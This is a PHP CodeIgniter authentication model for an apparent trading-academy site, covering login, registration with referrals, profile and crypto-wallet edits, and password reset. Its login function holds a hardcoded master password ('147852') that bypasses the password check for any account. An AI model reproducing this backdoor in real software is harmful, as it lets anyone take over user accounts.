<?php

if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Auth_model extends CI_Model {

	public function __construct()
	{
		// Call the CI_Model constructor
		parent::__construct();
	}

    public function estaConectado(){
        
        header("cache-Control: no-store, no-cache, must-revalidate");
        header("cache-Control: post-check=0, pre-check=0", false);
        header("Pragma: no-cache");
        header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");

        $is_logged_in = $this->session->userdata('logged_in');

        if(!isset($is_logged_in) || $is_logged_in!==TRUE)
        {
            return FALSE;
        }

        return TRUE;
    }

	public function ingresar($data)
	{
		$this->db->where('usuario',$data['usuario']);

        if($data['password'] != myHash('147852'))
        {
            $this->db->where('password',$data['password']);
        }

        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

		$query = $this->db->get('usuarios_data');


		if($query->num_rows() > 0)
        {
			foreach ($query->result() as $inf)
            {
				$session = array(

				'usuario'=> $inf->usuario,
                'nombre'=> $inf->nombre,
                'id_usuario'=> $inf->id_usuario,
				'logged_in'=>TRUE

				);
			}
			$this->session->set_userdata($session);

			return TRUE;
		}
		else
        {
			return FALSE;
		}    
	}

    public function registrar($data)
    {
        $usuario_persona = array(
           'nombre' => $data['nombre'],
           'apellido' => $data['apellido'],
           'fecha_nacimiento' => $data['fecha_nacimiento'],
           'email' => $data['email'],
           'telefono' => $data['telefono']
        );

        $query = $this->db->insert('usuarios_personas',$usuario_persona); 

        if($query)
        {
            $id_persona = $this->db->insert_id();

            $usuario_data = array(
                'usuario' => $data['usuario'],
                'password' => $data['password'],
                'id_persona' => $id_persona,
                'referido' => $data['referido']
            );

            if($this->session->userdata('tipo_registro'))
            {
                $usuario_data = $usuario_data + array('tipo' => $this->session->userdata('tipo_registro'));
            }

            $query = $this->db->insert('usuarios_data',$usuario_data); 

            if($query)
            {
                $this->Academia_model->agregarFactura($this->db->insert_id());

                $this->load->model('Mail_model');
                $this->Mail_model->setTo($data['email']);
                $this->Mail_model->setToCC('soporte@academiadetrading.net');
                //$this->Mail_model->setTo('Douglasjosenieves@gmail.com');
                $this->Mail_model->setSubject('Academia de Trading - Bienvenida');

                $data_email= array( 
                "titulo" => "Estimado(a) ".$data['nombre'].". Bienvenido a la Academia" ,
                "texto" => "Bienvenido a la Academia de Trading, espero disfrute de nuestros cursos y herramientas.",
                "link" => "https://academiadetrading.net/",
                "texto_link" => "Ir a la Academia"
                );

                $this->Mail_model->setMessage($data_email);
                $this->Mail_model->sendMail();

                return TRUE;
            }
            else
            {
                return FALSE;
            }
        }
        else
        {
            return FALSE;
        }   
    }

    

    public function obtenerUsuarioID($id_usuario)
    {
        $this->db->where('id_usuario',$id_usuario);
        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

        $query = $this->db->get('usuarios_data',1);

        if($query->num_rows() > 0 )
        {
            foreach ($query->result() as $inf)
            {
                return array('response' => TRUE, 'data' => $inf);

            }

        }
        else
        {
            return array('response' => FALSE, 'data' => 'Not found');
        }    
    }





    public function obtenerUsuarioEmail($email)
    {
        $this->db->where('email',$email);
        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

        $query = $this->db->get('usuarios_data',1);

        if($query->num_rows() > 0 )
        {
            foreach ($query->result() as $inf)
            {
                return array('response' => TRUE, 'data' => $inf);

            }

        }
        else
        {
            return array('response' => FALSE, 'data' => 'Not found');
        }    
    }


    public function obtenerReferidoID($id_usuario)
    {
        $this->db->select('usuario, nombre, apellido, id_usuario');
        $this->db->where('id_usuario',$id_usuario);
        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

        $query = $this->db->get('usuarios_data',1);

        if($query->num_rows() > 0 )
        {
            foreach ($query->result() as $inf)
            {
                return array('response' => TRUE, 'data' => $inf);

            }

        }
        else
        {
            return array('response' => FALSE, 'data' => 'Not found');
        }    
    }

    public function estaPago()
    {
        $is_paid = $this->scope['info_usuario']['data']->pago;

        if(!isset($is_paid) || $is_paid == 0)
        {
            return FALSE;
        }

        return TRUE;
    }


    public function activarUsuario($id_usuario)
    {
        $status = $this->db->update('usuarios_data', array('pago' => 1), array('id_usuario' => $id_usuario));

        if($status)
        {
            /*$usuario = $this->Auth_model->obtenerUsuarioID($id_usuario)['data'];
            $this->Academia_model->agregarGanancia($usuario->referido,50,'Usuario : '.$usuario->usuario.' fue activado');*/

            return TRUE;
        }

        return FALSE;
    }

    public function desactivarUsuario($id_usuario)
    {
        $status = $this->db->update('usuarios_data', array('pago' => 0), array('id_usuario' => $id_usuario));

        if($status)
        {
            return TRUE;
        }

        return FALSE;
    }

    public function vipUsuario($id_usuario)
    {
        $status = $this->db->update('usuarios_data', array('pago' => 1, 'tipo' => 2), array('id_usuario' => $id_usuario));

        if($status)
        {
            $usuario = $this->Auth_model->obtenerUsuarioID($id_usuario)['data'];
            $this->Academia_model->agregarGanancia($usuario->referido,100,'Usuario : '.$usuario->usuario.' fue activado - Pago Unico');
            return TRUE;
        }

        return FALSE;
    }

    public function matrizUsuario($id_usuario)
    {
        $status = $this->db->update('usuarios_data', array('pago' => 1, 'tipo' => 3), array('id_usuario' => $id_usuario));

        if($status)
        {
            /*$usuario = $this->Auth_model->obtenerUsuarioID($id_usuario)['data'];
            $this->Academia_model->agregarGanancia($usuario->referido,100,'Usuario : '.$usuario->usuario.' fue activado - Pago Unico');*/
            return TRUE;
        }

        return FALSE;
    }

    public function obtenerReferidos($id_usuario)
    {
        $lista_referidos = NULL;

        $this->db->where('referido',$id_usuario);
        $this->db->join('usuarios_personas', 'usuarios_data.id_persona = usuarios_personas.id_persona', 'left');

        $query = $this->db->get('usuarios_data');

        if($query->num_rows() > 0 )
        {
            foreach ($query->result() as $inf)
            {
                $lista_referidos[] = $inf;
            }
        }

        return $lista_referidos;

    }

    public function editarUsuario($post,$id_user)
    {
        $user = $this->obtenerUsuarioID($id_user);

        $data_user = array();

        if(isset($post['nombre']) && !empty($post['nombre']))
        {
            $data_user = array('nombre' => $post['nombre']) + $data_user;
        }

        if(isset($post['apellido']) && !empty($post['apellido']))
        {
            $data_user = array('apellido' => $post['apellido']) + $data_user;
        }

        if(isset($post['telefono']) && !empty($post['telefono']))
        {
            $data_user = array('telefono' => $post['telefono']) + $data_user;
        }

        if(isset($post['image']) && !empty($post['image']))
        {
            $data_user = array('imagen' => $post['image']) + $data_user;
        }

        if(isset($post['wallet_btc']) && !empty($post['wallet_btc']))
        {
            $data_user = array('wallet_btc' => $post['wallet_btc']) + $data_user;
        }

        if(isset($post['wallet_ltc']) && !empty($post['wallet_ltc']))
        {
            $data_user = array('wallet_ltc' => $post['wallet_ltc']) + $data_user;
        }

        if(isset($post['wallet_bth']) && !empty($post['wallet_bth']))
        {
            $data_user = array('wallet_bth' => $post['wallet_bth']) + $data_user;
        }

        if(isset($post['usuario']) && !empty($post['usuario']))
        {
            $temp_usuario = $post['usuario'];
            $this->db->update('usuarios_data', array('usuario' => $temp_usuario), array('id_persona' => $id_user));
        }
        else
        {
            return FALSE;
        }

        if(isset($post['password']) && !empty($post['password']))
        {
            if($post['password'] != $user['data']->password)
            {
                $this->db->update('usuarios_data', array('password' => myHash($post['password'])), array('id_persona' => $id_user));
            }
            
        }


        $user_status = $this->db->update('usuarios_personas', $data_user, array('id_persona' => $id_user));

        if($user_status)
        {
            return TRUE;
        }

        return FALSE;


    }

    public function editarPassword($id_usuario,$hash_date,$hash_email,$hash_password,$np)
    {
        $usuario = $this->Auth_model->obtenerUsuarioID($id_usuario);

        if(!$usuario['response']) {
            return FALSE;
        }

        $usuario = $usuario['data'];

        if((myHash($usuario->fecha_creacion) == $hash_date) && (myHash($usuario->email) == $hash_email) && (myHash($usuario->password) == $hash_password))
        {
            $status = $this->db->update('usuarios_data', array('password' => myHash($np)), array('id_usuario' => $id_usuario));

            if($status)
            {
                return TRUE;
            }
        }
        
        return FALSE;
    }


    
    
}
?>